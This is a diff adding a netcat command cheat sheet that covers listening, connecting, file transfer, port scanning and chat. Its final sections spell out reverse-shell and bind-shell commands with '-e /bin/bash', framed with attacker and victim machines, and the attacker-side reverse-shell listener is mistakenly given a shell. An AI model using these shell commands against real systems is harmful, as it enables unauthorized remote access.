@@ -1,0 +1,35 @@
+# netcat
+# Versatile networking utility to read and write data across networks.
+
+# Start a simple TCP server on a specified port
+nc -l -p PORT_NUMBER
+
+# Connect to a TCP server on a specified IP address and port
+nc IP_ADDRESS PORT_NUMBER
+
+# Transfer a file from a server to a client
+# On the server side (listening and sending the file)
+nc -l -p PORT_NUMBER < filename
+# On the client side (receiving the file)
+nc IP_ADDRESS PORT_NUMBER > filename
+
+# Scan open ports on a target host
+nc -zv IP_ADDRESS PORT_RANGE
+
+# Use netcat as a simple chat tool
+# On one machine (listening)
+nc -l -p PORT_NUMBER
+# On another machine (connecting to the listener)
+nc IP_ADDRESS PORT_NUMBER
+
+# Create a reverse shell from a client to a server
+# On the attacker's machine (listening)
+nc -l -p PORT_NUMBER -e /bin/bash
+# On the victim's machine (connecting back to the attacker's machine)
+nc IP_ADDRESS PORT_NUMBER -e /bin/bash
+
+# Bind shell on the server side
+# On the server machine (listening and attaching a shell)
+nc -l -p PORT_NUMBER -e /bin/bash
+# On the client machine (connecting to the bind shell)
+nc IP_ADDRESS PORT_NUMBER
